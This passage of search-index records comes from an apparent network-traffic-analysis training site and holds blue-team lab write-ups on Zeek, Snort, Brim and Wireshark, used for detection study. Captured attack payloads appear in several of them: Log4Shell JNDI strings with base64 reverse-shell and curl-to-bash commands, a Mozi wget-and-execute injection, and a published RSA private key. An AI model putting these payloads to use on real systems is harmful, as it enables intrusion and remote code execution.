    "c": "Nmap scans  Nmap is an industry-standard tool for mapping networks, identifying live hosts and discovering the services. As it is one of the most used network scanner tools, a security analyst should identify the network patterns created with it. This section will cover identifying the most common Nmap scan types. TCP connect scans SYN scans UDP scans It is essential to know how Nmap scans work to spot scan activity on the network. Questions  Use the Desktop/exercise-pcaps/nmap/Exercise.pcapng file. What is the total number of the TCP Connect scans? 1000 Which scan type is used to scan the TCP port 80? TCP Connect How many UDP close port messages are there? 1083 Which UDP port in the 55-70 port range is open? 68 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7871fdafe3a7e8dd60c0e9e3af764df0",
    "u": "https://nta.tymyrddin.dev/docs/zeek/log4j",
    "t": "Log4J ",
    "c": "Log4J  An alert triggered: Log4J Exploitation Attempt . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the log4shell.pcapng file with detection-log4j.zeek script. zeek -C -r log4shell.pcapng detection-log4j.zeek Investigate the signature.log file. What is the number of signature hits? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat signatures.log | zeek-cut uid | wc -l 3 Investigate the http.log file. Which tool is used for scanning? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut user_agent ... Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) Investigate the http.log file. What is the extension of the exploit file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut uri | uniq / /ExploitQ8v7ygBW4i.class / /ExploitSMMZvT8GXL.class / /Exploit6HHc3BcVzI.class / testing1 /testing1 /testing123 / Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/log4j$ cat log4j.log | zeek-cut value | uniq ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=} ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==} ${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==} ${jndi:ldap://127.0.0.1:1389} ${jndi:ldap://192.168.56.102} ${jndi:ldap://192.168.56.102:389} ${jndi:ldap://192.168.56.102:389/test} ${jndi:ldap://192.168.56.102:389} pwned That’s it.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "fb411314a2c585eb9c1fd01afb91f55f",
    "u": "https://nta.tymyrddin.dev/docs/brim/malware",
    "t": "Malware C2 detection ",
    "c": "Malware C2 detection  It is just another malware campaign spread with CobaltStrike. We know an employee clicks on a link, downloads a file, and then network speed issues and anomalous traffic activity arises. Questions  What is the name of the file downloaded from the CobaltStrike C2 connection? _path==\"http\" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c 4564.exe What is the number of CobaltStrike connections using port 443? _path==\"conn\" | 104.168.44.45 | 443 | count() 328 There is an additional C2 channel in used the given case. What is the name of the secondary C2 channel? event_type==\"alert\" | cut alert.signature | sort -r | uniq -c | sort -r count IcedID Alert Ai.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "bfa2a1063e780655694e85efc0333463",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ssl",
    "t": "SSL HTTP exchange ",
    "c": "SSL HTTP exchange  root-me challenge SSL - HTTP Exchange : This challenge comes from the 19th DEFCON CTF’s qualification (pkt300). CLUE : “google is your friend : inurl:server.pem…” Google Dorking: inurl:server.pem apple intext:-----BEGIN RSA PRIVATE KEY----- -----BEGIN CERTIFICATE----- MIIDBjCCAm+gAwIBAgIBATANBgkqhkiG9w0BAQQFADB7MQswCQYDVQQGEwJTRzER MA8GA1UEChMITTJDcnlwdG8xFDASBgNVBAsTC00yQ3J5cHRvIENBMSQwIgYDVQQD ExtNMkNyeXB0byBDZXJ0aWZpY2F0ZSBNYXN0ZXIxHTAbBgkqhkiG9w0BCQEWDm5n cHNAcG9zdDEuY29tMB4XDTAwMDkxMDA5NTEzMFoXDTAyMDkxMDA5NTEzMFowUzEL MAkGA1UEBhMCU0cxETAPBgNVBAoTCE0yQ3J5cHRvMRIwEAYDVQQDEwlsb2NhbGhv c3QxHTAbBgkqhkiG9w0BCQEWDm5ncHNAcG9zdDEuY29tMFwwDQYJKoZIhvcNAQEB BQADSwAwSAJBAKy+e3dulvXzV7zoTZWc5TzgApr8DmeQHTYC8ydfzH7EECe4R1Xh 5kwIzOuuFfn178FBiS84gngaNcrFi0Z5fAkCAwEAAaOCAQQwggEAMAkGA1UdEwQC MAAwLAYJYIZIAYb4QgENBB8WHU9wZW5TU0wgR2VuZXJhdGVkIENlcnRpZmljYXRl MB0GA1UdDgQWBBTPhIKSvnsmYsBVNWjj0m3M2z0qVTCBpQYDVR0jBIGdMIGagBT7 hyNp65w6kxXlxb8pUU/+7Sg4AaF/pH0wezELMAkGA1UEBhMCU0cxETAPBgNVBAoT CE0yQ3J5cHRvMRQwEgYDVQQLEwtNMkNyeXB0byBDQTEkMCIGA1UEAxMbTTJDcnlw dG8gQ2VydGlmaWNhdGUgTWFzdGVyMR0wGwYJKoZIhvcNAQkBFg5uZ3BzQHBvc3Qx LmNvbYIBADANBgkqhkiG9w0BAQQFAAOBgQA7/CqT6PoHycTdhEStWNZde7M/2Yc6 BoJuVwnW8YxGO8Sn6UJ4FeffZNcYZddSDKosw8LtPOeWoK3JINjAk5jiPQ2cww++ 7QGG/g5NDjxFZNDJP1dGiLAxPW6JXwov4v0FmdzfLOZ01jDcgQQZqEpYlgpuI5JE WUQ9Ho4EzbYCOQ== -----END CERTIFICATE----- -----BEGIN RSA PRIVATE KEY----- MIIBPAIBAAJBAKy+e3dulvXzV7zoTZWc5TzgApr8DmeQHTYC8ydfzH7EECe4R1Xh 5kwIzOuuFfn178FBiS84gngaNcrFi0Z5fAkCAwEAAQJBAIqm/bz4NA1H++Vx5Ewx OcKp3w19QSaZAwlGRtsUxrP7436QjnREM3Bm8ygU11BjkPVmtrKm6AayQfCHqJoT ZIECIQDW0BoMoL0HOYM/mrTLhaykYAVqgIeJsPjvkEhTFXWBuQIhAM3deFAvWNu4 nklUQ37XsCT2c9tmNt1LAT+slG2JOTTRAiAuXDtC/m3NYVwyHfFm+zKHRzHkClk2 HjubeEgjpj32AQIhAJqMGTaZVOwevTXvvHwNEH+vRWsAYU/gbx+OQB+7VOcBAiEA oolb6NMg/R3enNPvS1O4UU1H8wpaF77L4yiSWlE0p4w= -----END RSA PRIVATE KEY----- -----BEGIN CERTIFICATE REQUEST----- MIIBDTCBuAIBADBTMQswCQYDVQQGEwJTRzERMA8GA1UEChMITTJDcnlwdG8xEjAQ BgNVBAMTCWxvY2FsaG9zdDEdMBsGCSqGSIb3DQEJARYObmdwc0Bwb3N0MS5jb20w XDANBgkqhkiG9w0BAQEFAANLADBIAkEArL57d26W9fNXvOhNlZzlPOACmvwOZ5Ad NgLzJ1/MfsQQJ7hHVeHmTAjM664V+fXvwUGJLziCeBo1ysWLRnl8CQIDAQABoAAw DQYJKoZIhvcNAQEEBQADQQA7uqbrNTjVWpF6By5ZNPvhZ4YdFgkeXFVWi5ao/TaP Vq4BG021fJ9nlHRtr4rotpgHDX1rr+iWeHKsx4+5DRSy -----END CERTIFICATE REQUEST----- Use ssldump : ssldump -dq -r ch5.pcap -k server.pem New TCP connection #1: 192.168.1.5(51663) <-> 192.168.1.9(4433) 1 1 0.0976 (0.0976) C>S SSLv2 compatible client hello 1 2 0.1700 (0.0724) S>C Handshake ServerHello Short read: 0 bytes available (expecting 2) 1 3 0.1700 (0.0000) S>C Handshake Certificate 1 4 0.1700 (0.0000) S>C Handshake ServerHelloDone 1 5 0.1712 (0.0011) C>S Handshake ClientKeyExchange 1 6 0.1712 (0.0000) C>S ChangeCipherSpec 1 7 0.1712 (0.0000) C>S Handshake Finished 1 8 0.2046 (0.0333) S>C ChangeCipherSpec 1 9 0.2046 (0.0000) S>C Handshake Finished 1 10 0.2180 (0.0134) S>C application_data --------------------------------------------------------------- --------------------------------------------------------------- 1 11 0.2180 (0.0000) S>C application_data ... Resources  BlackHat USA 09 Zusman Attack BlackHat USA 09 Marlin Spike Defeat BlackHat USA 09 Zusman Attack Breaking TLS using SSLv2 rfc2246",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "6c7e87d9bfa07501410f7a75e703c79f",
    "u": "https://nta.tymyrddin.dev/docs/root-me/bl-unknown-file",
    "t": "Bluetooth Unknown file ",
    "c": "Bluetooth Unknown file  root-me challenge Bluetooth - Unknown file : Your friend working at NSA recovered an unreadable file from a hacker’s computer. The only thing he knows is that it comes from a communication between a computer and a phone. The answer is the SHA-1 hash of the concatenation of the MAC address (uppercase) and the name of the phone. Example: AB:CD:EF:12:34:56myPhone -> 023cc433c380c2618ed961000a681f1d4c44f8f1 wget the bin from root-me file ch18.bin strings ch18.bin hcidump -r ch18.bin Extract MAC address and phone name, concat Hash it",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a65b64eab58c5b5f7a75dfb2f42cface",
    "u": "https://nta.tymyrddin.dev/docs/snort/reverse-shell",
    "t": "Reverse shell ",
    "c": "Reverse shell  You: J.A.V.A. can you do a quick scan for me? We haven’t investigated the outbound traffic yet. J.A.V.A.: Yes, sir. Outbound traffic investigation has begun. THE NARRATOR: The outbound traffic? Why? YOU: We have stopped some inbound access attempts, so we didn’t let the bad guys get in. How about the bad guys who are already inside? Also, no need to mention the insider risks, huh? The dwell time is still around 1-3 months, and I am quite new here, so it is worth checking the outgoing traffic as well. J.A.V.A.: Sir, persistent outbound traffic is detected. Possibly a reverse shell… YOU: You got it! J.A.V.A.: Sir, you need to observe the traffic with Snort and identify the anomaly first. Then you can create a rule to stop the reverse shell. GOOD LUCK! Start in sniffer mode and capture some data: sudo snort -dev -l . Investigate with the logfile just created: sudo snort -r snort.log.1669602099 Port 4444? $ sudo snort -r snort.log.1669602099 'port 4444' -n 10 ... WARNING: No preprocessors configured for policy 0. 11/28-02:21:39.625212 10.10.144.156:4444 -> 10.10.196.55:54128 TCP TTL:64 TOS:0x0 ID:9999 IpLen:20 DgmLen:52 DF ***A***F Seq: 0x2FE7575D Ack: 0x56C876C1 Win: 0x1E9 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1980585364 2358417664 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 11/28-02:21:39.645400 10.10.196.55:54128 -> 10.10.144.156:4444 TCP TTL:64 TOS:0x0 ID:11389 IpLen:20 DgmLen:52 DF ***A**** Seq: 0x56C876C1 Ack: 0x2FE7575E Win: 0x1EB TcpLen: 32 TCP Options (3) => NOP NOP TS: 2358417665 1980585364 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ TCP port 4444. Metasploit. Create a rule: sudo nano /etc/snort/rules/local.rules # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. drop tcp any 4444 <> any any (msg: \"Reverse Shell Port Detected\"; sid: 100001; rev:1;) Start snort in IPS mode: sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full And flag!",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "db5e4764414f561a8f0d5924aff38cc2",
    "u": "https://nta.tymyrddin.dev/docs/snort/log4j",
    "t": "Log4j ",
    "c": "Log4j  ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -dev -l . -r log4j.pcap New ruleset: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg:\"Abnormal packet size detected\"; dsize: 770<>855; sid: 100001; rev:1;) ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -d -r snort.log.1669592367 -n 4 Exiting after 4 packets Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669592367\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=3237) WARNING: No preprocessors configured for policy 0. 12/11-11:01:34.486776 49.143.32.6:4788 -> 198.71.247.91:80 TCP TTL:49 TOS:0x0 ID:55286 IpLen:20 DgmLen:842 ***AP*** Seq: 0x6C5341A2 Ack: 0x8A162B60 Win: 0xB68 TcpLen: 32 TCP Options (3) => NOP NOP TS: 956236 2733624246 50 4F 53 54 20 2F 48 4E 41 50 31 2F 20 48 54 54 POST /HNAP1/ HTT 50 2F 31 2E 30 0D 0A 48 6F 73 74 3A 20 31 39 38 P/1.0..Host: 198 2E 37 31 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 43 .71.247.91:80..C 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 ontent-Type: tex 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 22 t/xml; charset=\" 75 74 66 2D 38 22 0D 0A 53 4F 41 50 41 63 74 69 utf-8\"..SOAPActi 6F 6E 3A 20 68 74 74 70 3A 2F 2F 70 75 72 65 6E on: http://puren 65 74 77 6F 72 6B 73 2E 63 6F 6D 2F 48 4E 41 50 etworks.com/HNAP 31 2F 60 63 64 20 2F 74 6D 70 20 26 26 20 72 6D 1/`cd /tmp && rm 20 2D 72 66 20 2A 20 26 26 20 77 67 65 74 20 68 -rf * && wget h 74 74 70 3A 2F 2F 31 39 32 2E 31 36 38 2E 31 2E ttp://192.168.1. 31 3A 38 30 38 38 2F 4D 6F 7A 69 2E 6D 20 26 26 1:8088/Mozi.m && 20 63 68 6D 6F 64 20 37 37 37 20 2F 74 6D 70 2F chmod 777 /tmp/ 4D 6F 7A 69 2E 6D 20 26 26 20 2F 74 6D 70 2F 4D Mozi.m && /tmp/M 6F 7A 69 2E 6D 60 0D 0A 43 6F 6E 74 65 6E 74 2D ozi.m`..Content- 4C 65 6E 67 74 68 3A 20 36 34 30 0D 0A 0D 0A 3C Length: 640....< 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E ?xml version=\"1. 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66 0\" encoding=\"utf 2D 38 22 3F 3E 3C 73 6F 61 70 3A 45 6E 76 65 6C -8\"?><soap:Envel 6F 70 65 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68 ope xmlns:xsi=\"h 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 ttp://www.w3.org 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 2D /2001/XMLSchema- 69 6E 73 74 61 6E 63 65 22 20 78 6D 6C 6E 73 3A instance\" xmlns: 78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E xsd=\"http://www. 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 w3.org/2001/XMLS 63 68 65 6D 61 22 20 78 6D 6C 6E 73 3A 73 6F 61 chema\" xmlns:soa 70 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 p=\"http://schema 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F s.xmlsoap.org/so 61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 3E 3C 73 ap/envelope/\"><s 6F 61 70 3A 42 6F 64 79 3E 3C 41 64 64 50 6F 72 oap:Body><AddPor 74 4D 61 70 70 69 6E 67 20 78 6D 6C 6E 73 3D 22 tMapping xmlns=\" 68 74 74 70 3A 2F 2F 70 75 72 65 6E 65 74 77 6F http://purenetwo 72 6B 73 2E 63 6F 6D 2F 48 4E 41 50 31 2F 22 3E rks.com/HNAP1/\"> 3C 50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63 <PortMappingDesc 72 69 70 74 69 6F 6E 3E 66 6F 6F 62 61 72 3C 2F ription>foobar</ 50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63 72 PortMappingDescr 69 70 74 69 6F 6E 3E 3C 49 6E 74 65 72 6E 61 6C iption><Internal 43 6C 69 65 6E 74 3E 31 39 32 2E 31 36 38 2E 30 Client>192.168.0 2E 31 30 30 3C 2F 49 6E 74 65 72 6E 61 6C 43 6C .100</InternalCl 69 65 6E 74 3E 3C 50 6F 72 74 4D 61 70 70 69 6E ient><PortMappin 67 50 72 6F 74 6F 63 6F 6C 3E 54 43 50 3C 2F 50 gProtocol>TCP</P 6F 72 74 4D 61 70 70 69 6E 67 50 72 6F 74 6F 63 ortMappingProtoc 6F 6C 3E 3C 45 78 74 65 72 6E 61 6C 50 6F 72 74 ol><ExternalPort 3E 31 32 33 34 3C 2F 45 78 74 65 72 6E 61 6C 50 >1234</ExternalP 6F 72 74 3E 3C 49 6E 74 65 72 6E 61 6C 50 6F 72 ort><InternalPor 74 3E 31 32 33 34 3C 2F 49 6E 74 65 72 6E 61 6C t>1234</Internal 50 6F 72 74 3E 3C 2F 41 64 64 50 6F 72 74 4D 61 Port></AddPortMa 70 70 69 6E 67 3E 3C 2F 73 6F 61 70 3A 42 6F 64 pping></soap:Bod 79 3E 3C 2F 73 6F 61 70 3A 45 6E 76 65 6C 6F 70 y></soap:Envelop 65 3E 0D 0A 0D 0A e>.... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... ... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80 TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827 ***AP*** Seq: 0xDC9A621B Ack: 0x9B92AFC8 Win: 0x1F6 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1584792788 1670627000 47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C GET /?x=${jndi:l 64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 dap://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31 fGJhc2g=} HTTP/1 2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31 .1..Host: 198.71 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72 .247.91:80..User 2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A -Agent: ${${::-j 7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24 }${::-n}${::-d}$ 7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B {::-i}:${::-l}${ 3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A ::-d}${::-a}${:: 2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 -p}://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72 fGJhc2g=}..Refer 65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77 er: ${jndi:${low 65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24 er:l}${lower:d}$ 7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72 {lower:a}${lower 3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35 :p}://45.155.205 2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63 .233:12344/Basic 2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F /Command/Base64/ 4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75 KGN1cmwgLXMgNDUu 4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36 MTU1LjIwNS4yMzM6 4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79 NTg3NC8xNjIuMC4y 4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33 MjguMjUzOjgwfHx3 5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30 Z2V0IC1xIC1PLSA0 4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A NS4xNTUuMjA1LjIz 4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77 Mzo1ODc0LzE2Mi4w 4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70 LjIyOC4yNTM6ODAp 66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d633fa6d4bfe0938a062004c4e96ad46",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/tunnels",
    "t": "Tunneling traffic ",
    "c": "Tunneling traffic  Traffic tunnelling is (also known as “port forwarding”) transferring the data/resources in a secure method to network segments and zones. It can be used for “internet to private networks” and “private networks to internet” flow/direction. There is an encapsulation process to hide the data, so the transferred data appear natural for the case, but it contains private data packets and transfers them to the final destination securely. Tunnelling provides anonymity and traffic security and is heavily used by enterprise networks. As it gives a significant level of data encryption, attackers use tunnelling to bypass security perimeters using the standard and trusted protocols used in everyday traffic like ICMP and DNS. It is crucial to have the ability to spot ICMP and DNS anomalies. ICMP analysis  Internet Control Message Protocol (ICMP) is designed for diagnosing and reporting network communication issues. It is used in error reporting and testing. As it is a trusted network layer protocol, sometimes it is used for denial of service (DoS) attacks; also, adversaries use it in data exfiltration and C2 tunnelling activities. Usually, ICMP tunnelling attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. As the ICMP packets can transfer an additional data payload, adversaries use this section to exfiltrate data and establish a C2 connection. It could be a TCP, HTTP or SSH data. As the ICMP protocols provide a great opportunity to carry extra data, it also has disadvantages. Most enterprise networks block custom packets or require administrator privileges to create custom ICMP packets. A large volume of ICMP traffic or anomalous packet sizes are indicators of ICMP tunnelling. And be aware, adversaries can create custom packets that match the regular ICMP packet size (64 bytes), so it is still cumbersome to detect these tunnelling activities. DNS analysis  Domain Name System (DNS) is designed to translate/convert IP domain addresses to IP addresses. It is also known as a phonebook of the internet. As it is the essential part of web services, it is commonly used and trusted, and therefore also often ignored. Due to that, adversaries use it in data exfiltration and C2 activities. Similar to ICMP tunnels, DNS attacks are anomalies appearing/starting after a malware execution or vulnerability exploitation. Adversary creates (or already has) a domain address and configures it as a C2 channel. The malware or the commands executed after exploitation sends DNS queries to the C2 server. These queries are longer than default DNS queries and crafted for subdomain addresses. And these subdomain addresses are not actual addresses; they are encoded commands. encoded-commands.maliciousdomain.com When this query is routed to the C2 server, the server sends the actual malicious commands to the host. As the DNS queries are a natural part of the networking activity, these packets have the chance of not being detected by network perimeters. Questions  Use the Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap file. Investigate the anomalous packets. Which protocol is used in ICMP tunnelling? ssh Use the Desktop/exercise-pcaps/dns-icmp/dns.pcap file. Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.) dataexfil[.]com .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8b90023dad7d38f2f274ebd99b792f09",
    "u": "https://nta.tymyrddin.dev/docs/snort/ids-rules",
    "t": "Writing IDS rules ",
    "c": "Writing IDS rules  HTTP  local.rules : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 80 (msg: \"HTTP Packet Detected\"; sid: 100001; rev:1;) alert tcp any 80 <> any any (msg: \"HTTP Packet Detected\"; sid: 100002; rev:2;) Get statistics and create a snort.log file: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -c local.rules -dev -l . -r mx-3.pcap =============================================================================== Run time for packet processing was 1.10785 seconds Snort processed 460 packets. Snort ran for 0 days 0 hours 0 minutes 1 seconds Pkts/sec: 460 =============================================================================== Memory usage summary: Total non-mmapped bytes (arena): 2289664 Bytes in mapped regions (hblkhd): 17391616 Total allocated space (uordblks): 2066640 Total free space (fordblks): 223024 Topmost releasable block (keepcost): 65888 =============================================================================== Packet I/O Totals: Received: 460 Analyzed: 460 (100.000%) Dropped: 0 ( 0.000%) Filtered: 0 ( 0.000%) Outstanding: 0 ( 0.000%) Injected: 0 =============================================================================== Breakdown by protocol (includes rebuilt packets): Eth: 460 (100.000%) VLAN: 0 ( 0.000%) IP4: 444 ( 96.522%) Frag: 0 ( 0.000%) ICMP: 272 ( 59.130%) UDP: 8 ( 1.739%) TCP: 164 ( 35.652%) IP6: 0 ( 0.000%) IP6 Ext: 0 ( 0.000%) IP6 Opts: 0 ( 0.000%) Frag6: 0 ( 0.000%) ICMP6: 0 ( 0.000%) UDP6: 0 ( 0.000%) TCP6: 0 ( 0.000%) Teredo: 0 ( 0.000%) ICMP-IP: 0 ( 0.000%) IP4/IP4: 0 ( 0.000%) IP4/IP6: 0 ( 0.000%) IP6/IP4: 0 ( 0.000%) IP6/IP6: 0 ( 0.000%) GRE: 0 ( 0.000%) GRE Eth: 0 ( 0.000%) GRE VLAN: 0 ( 0.000%) GRE IP4: 0 ( 0.000%) GRE IP6: 0 ( 0.000%) GRE IP6 Ext: 0 ( 0.000%) GRE PPTP: 0 ( 0.000%) GRE ARP: 0 ( 0.000%) GRE IPX: 0 ( 0.000%) GRE Loop: 0 ( 0.000%) MPLS: 0 ( 0.000%) ARP: 16 ( 3.478%) IPX: 0 ( 0.000%) Eth Loop: 0 ( 0.000%) Eth Disc: 0 ( 0.000%) IP4 Disc: 0 ( 0.000%) IP6 Disc: 0 ( 0.000%) TCP Disc: 0 ( 0.000%) UDP Disc: 0 ( 0.000%) ICMP Disc: 0 ( 0.000%) All Discard: 0 ( 0.000%) Other: 0 ( 0.000%) Bad Chk Sum: 0 ( 0.000%) Bad TTL: 0 ( 0.000%) S5 G 1: 0 ( 0.000%) S5 G 2: 0 ( 0.000%) Total: 460 =============================================================================== Action Stats: Alerts: 328 ( 71.304%) Logged: 328 ( 71.304%) Passed: 0 ( 0.000%) Limits: Match: 0 Queue: 0 Log: 0 Event: 0 Alert: 0 Verdicts: Allow: 460 (100.000%) Block: 0 ( 0.000%) Replace: 0 ( 0.000%) Whitelist: 0 ( 0.000%) Blacklist: 0 ( 0.000%) Ignore: 0 ( 0.000%) Retry: 0 ( 0.000%) =============================================================================== Snort exiting ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ Investigating packet 63 using the generated snort.log file: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1669574637 -n 63 ... =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 05/13-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372 